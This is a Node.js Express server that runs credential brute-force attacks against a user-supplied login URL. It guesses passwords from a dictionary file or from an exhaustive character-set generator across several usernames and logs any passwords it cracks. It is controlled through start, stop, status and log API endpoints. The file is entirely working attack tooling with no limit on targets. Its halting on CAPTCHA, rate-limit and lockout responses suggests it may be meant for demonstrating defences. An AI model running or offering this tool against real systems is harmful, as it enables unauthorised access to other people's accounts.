const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

let attackLogs = [];
let isRunning = false;
let shouldStop = false;

function addLog(message) {
  const timestamp = new Date().toLocaleTimeString();
  attackLogs.push(`[${timestamp}] ${message}`);
  if (attackLogs.length > 500) {
     attackLogs = attackLogs.slice(-500);
  }
}

async function runAttack(targetUrl, targetUsername, options) {
  attackLogs = [];
  isRunning = true;
  shouldStop = false;
  let count = 0;

  const { attackType, dictionaryName, characters, length } = options;

  addLog(`Starting Brute Force Attack...`);
  addLog(`Target URL: ${targetUrl}`);
  addLog(`Target Username: ${targetUsername}`);

  if (attackType === 'dictionary') {
    addLog(`Dictionary: ${dictionaryName}`);
  } else {
    addLog(`Custom Brute Force: Characters='${characters}', Length=${length}`);
  }

  const startTime = Date.now();

  addLog(`Checking target URL reachability...`);
  try {
    await fetch(targetUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: '__probe__' , password: '__probe__' }),
      signal: AbortSignal.timeout(5000),
    });
    addLog(`Target URL is reachable. Starting attack...`);
  } catch (probeErr) {
    const isNetworkError =
      probeErr.cause?.code === 'ECONNREFUSED' ||
      probeErr.cause?.code === 'ENOTFOUND' ||
      probeErr.cause?.code === 'ECONNRESET' ||
      probeErr.name === 'TimeoutError' ||
      probeErr.message?.includes('fetch failed');

    if (isNetworkError) {
      addLog(`\n[!] ERROR: Target URL is unreachable.`);
      addLog(`[!] URL: ${targetUrl}`);
      addLog(`[!] Reason: ${probeErr.cause?.message || probeErr.message}`);
      addLog(`[!] Make sure the target server is running and the URL is correct.`);
      addLog(`[!] Attack aborted — no passwords were tried.`);
      isRunning = false;
      return;
    }
    addLog(`Target URL is reachable (responded to probe). Starting attack...`);
  }

  try {
    let wordsIterable;

    if (attackType === 'dictionary') {
      const filePath = path.join(__dirname, '..', dictionaryName);
      if (!fs.existsSync(filePath)) {
          addLog(`ERROR: Dictionary file '${dictionaryName}' not found in attack directory.`);
          isRunning = false;
          return;
      }

      const data = fs.readFileSync(filePath, 'utf8');
      const words = data.split(/\r?\n/).filter(w => w.trim());
      addLog(`Loaded ${words.length} passwords from dictionary.`);
      wordsIterable = words;
    } else {
      const chars = characters;
      const len = parseInt(length, 10);
      const totalCombinations = Math.pow(chars.length, len);
      addLog(`Total possible combinations: ${totalCombinations}`);

      function* generateCombinations(c, l, currentPrefix = '') {
          if (shouldStop) return;
          if (l === 0) {
              yield currentPrefix;
              return;
          }
          for (let i = 0; i < c.length; i++) {
              yield* generateCombinations(c, l - 1, currentPrefix + c[i]);
          }
      }
      wordsIterable = {
          [Symbol.iterator]: () => generateCombinations(chars, len)
      };
    }

    addLog(`Initiating network requests...`);

    let activeUsers = targetUsername.split(',').map(u => u.trim()).filter(u => u.length > 0);
    if (activeUsers.length === 0) {
        addLog(`ERROR: No target usernames provided.`);
        isRunning = false;
        return;
    }

    for (const word of wordsIterable) {
      if (shouldStop) {
          addLog(`\n[!] Attack manually stopped by user.`);
          break;
      }

      const password = typeof word === 'string' ? word.trim() : word;
      if (!password) continue;

      for (let i = 0; i < activeUsers.length; i++) {
          const tUser = activeUsers[i];
          if (shouldStop) break;

          count++;
          addLog(`[Attempt ${count}] Trying ${tUser}:${password}`);

          try {
              const response = await fetch(targetUrl, {
                  method: 'POST',
                  headers: {
                      'Content-Type': 'application/json',
                  },
                  body: JSON.stringify({
                      username: tUser,
                      password: password,
                  }),
              });

              if (response.ok) {
                const timeTaken = (Date.now() - startTime) / 1000;
                addLog(`\n[+] SUCCESS! Password found for user '${tUser}': ${password}`);
                activeUsers.splice(i, 1);
                i--;
              } else if (response.status === 403) {
                const resData = await response.json().catch(() => ({}));
                addLog(`\n[!] ATTACK BLOCKED: Bot Challenge / CAPTCHA Triggered (403 Forbidden)`);
                addLog(`[!] Server response: ${resData.message || 'Security verification (CAPTCHA) required.'}`);
                addLog(`[!] Automated brute force halted — human verification challenge cannot be bypassed by automated scripts.`);
                isRunning = false;
                return;
              } else if (response.status === 429) {
                addLog(`\n[!] ATTACK BLOCKED: Rate Limit Exceeded (429 Too Many Requests)`);
                addLog(`[!] The target server is actively defending against brute force via IP rate limiting.`);
                addLog(`[!] Aborting attack run to prevent IP ban...`);
                isRunning = false;
                return;
              } else if (response.status === 423) {
                const resData = await response.json().catch(() => ({}));
                addLog(`\n[!] ATTACK BLOCKED: Account Locked (423 Locked) for '${tUser}'`);
                addLog(`[!] Server response: ${resData.message || 'Account temporarily locked due to excessive failed attempts.'}`);
                addLog(`[!] The target server locked this specific account, halting further credential attempts.`);
                activeUsers.splice(i, 1);
                i--;
                if (activeUsers.length === 0) {
                  addLog(`\n[!] All target accounts are locked or cracked. Ending attack.`);
                  isRunning = false;
                  return;
                }
              }
          } catch (reqErr) {
              const isNetworkError =
                reqErr.cause?.code === 'ECONNREFUSED' ||
                reqErr.cause?.code === 'ENOTFOUND' ||
                reqErr.cause?.code === 'ECONNRESET' ||
                reqErr.name === 'TimeoutError' ||
                reqErr.message?.includes('fetch failed');

              if (isNetworkError) {
                addLog(`\n[!] NETWORK ERROR: Lost connection to target server.`);
                addLog(`[!] URL: ${targetUrl}`);
                addLog(`[!] Reason: ${reqErr.cause?.message || reqErr.message}`);
                addLog(`[!] The server may have gone down or the URL is wrong.`);
                addLog(`[!] Aborting attack.`);
                isRunning = false;
                return;
              }

              addLog(`[-] Attempt ${count} failed (transient): ${reqErr.message} — skipping.`);
          }
      }

      if (activeUsers.length === 0) {
          addLog(`\n[+] All target users were processed!`);
          const timeTaken = (Date.now() - startTime) / 1000;
          addLog(`⏰ Time taken: ${timeTaken} seconds`);
          break;
      }
    }

    if (!shouldStop && activeUsers.length > 0) {
      const timeTaken = (Date.now() - startTime) / 1000;
      addLog(`\n[-] Finished. Tried ${count} combinations.`);
      if (activeUsers.length < targetUsername.split(',').filter(x => x.trim()).length) {
          addLog(`Some passwords were found, but not for all users.`);
      } else {
          addLog(`No matches found for any user.`);
      }
      addLog(`⏰ Total time elapsed: ${timeTaken} seconds`);
    }
  } catch (err) {
    addLog(`ERROR: ${err.message}`);
    console.error(err);
  }

  isRunning = false;
}

app.get('/api/status', (req, res) => {
    res.json({ isRunning });
});

app.get('/api/logs', (req, res) => {
    res.json({ logs: attackLogs });
});

app.post('/api/start', (req, res) => {
    const { url, username, dictionary, attackType, characters, length } = req.body;

    if (isRunning) {
        return res.status(400).json({ error: 'Attack is already running.' });
    }
    if (!url || !username) {
        return res.status(400).json({ error: 'Missing target URL or username.' });
    }

    const options = {
        attackType: attackType || 'dictionary',
        dictionaryName: dictionary,
        characters: characters || '',
        length: length || 0
    };

    runAttack(url, username, options);

    res.json({ message: 'Attack started' });
});

app.post('/api/stop', (req, res) => {
    if (!isRunning) {
        return res.status(400).json({ error: 'No attack is currently running.' });
    }
    shouldStop = true;
    res.json({ message: 'Stopping attack...' });
});

const PORT = 3001;
app.listen(PORT, () => {
    console.log(`Brute Force API Server running on port ${PORT}`);
});
